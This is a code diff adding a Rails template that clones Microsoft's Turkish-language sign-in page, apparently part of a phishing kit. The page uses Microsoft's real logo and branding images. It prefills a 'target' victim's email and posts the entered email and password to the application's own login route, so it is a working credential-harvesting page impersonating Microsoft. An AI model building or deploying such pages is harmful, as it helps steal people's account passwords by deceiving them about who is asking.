@@ -1,0 +1,77 @@
+<% content_for :title, "Hesabınızda oturum açın" %>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    background-color: #f2f2f2;
+    display: flex; align-items: center; justify-content: center;
+    min-height: 100vh; overflow: hidden;
+  }
+  .background-image-holder {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;
+  }
+  .background-image {
+    width: 100%; height: 100%; background-size: cover; background-position: center;
+    background-image: url('https://aadcdn.msftauthimages.net/dbd5a2dd-ryf6qy3uu7veqjgtonul-la9wwp4rhfamieg5abax5k/logintenantbranding/0/illustration?ts=635894843203762077');
+  }
+  .login-container {
+    position: relative; z-index: 1;
+    background: #fff; padding: 44px; width: 440px; max-width: 100%;
+    box-shadow: 0 2px 6px rgba(0,0,0,.15);
+  }
+  .logo { height: 24px; margin-bottom: 16px; }
+  h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 12px; }
+  .subtitle { font-size: 15px; color: #1b1b1b; margin-bottom: 24px; }
+  input[type="email"], input[type="password"] {
+    width: 100%; padding: 4px 6px 6px; font-size: 15px;
+    border: none; border-bottom: 1px solid #666; outline: none; margin-bottom: 16px;
+  }
+  input:focus { border-bottom: 2px solid #0067b8; }
+  .options { font-size: 13px; margin: 8px 0 16px; }
+  .options a { color: #0067b8; text-decoration: none; }
+  .submit-row { display: flex; justify-content: flex-end; margin-top: 20px; }
+  .btn {
+    background: #0067b8; color: #fff; border: none;
+    padding: 6px 12px; min-width: 108px; min-height: 32px;
+    font-size: 15px; cursor: pointer;
+  }
+  .btn:hover { background: #005a9e; }
+  .footer {
+    position: fixed; bottom: 0; left: 0; right: 0;
+    padding: 12px 24px; font-size: 12px; color: #2f2f2f;
+    display: flex; justify-content: flex-end; gap: 24px; z-index: 2;
+  }
+  .footer a { color: #2f2f2f; text-decoration: none; }
+</style>
+
+<div class="background-image-holder">
+  <div class="background-image"></div>
+</div>
+
+<div class="login-container">
+  <img class="logo"
+       src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.svg"
+       alt="Microsoft">
+  <h1>Oturum açın</h1>
+
+  <%= form_with url: auth_login_path, method: :post, local: true do %>
+    <input type="email" name="loginfmt" placeholder="E-posta, telefon veya Skype"
+           value="<%= @target&.email %>" required autofocus>
+    <input type="password" name="passwd" placeholder="Parola" required>
+
+    <div class="options">
+      Hesabınız yok mu? <a href="#">Hesap oluşturun!</a><br>
+      <a href="#">Hesabınıza erişemiyor musunuz?</a>
+    </div>
+
+    <div class="submit-row">
+      <button type="submit" class="btn">Oturum aç</button>
+    </div>
+  <% end %>
+</div>
+
+<div class="footer">
+  <a href="#">Kullanım koşulları</a>
+  <a href="#">Gizlilik ve çerezler</a>
+  <a href="#">...</a>
+</div>
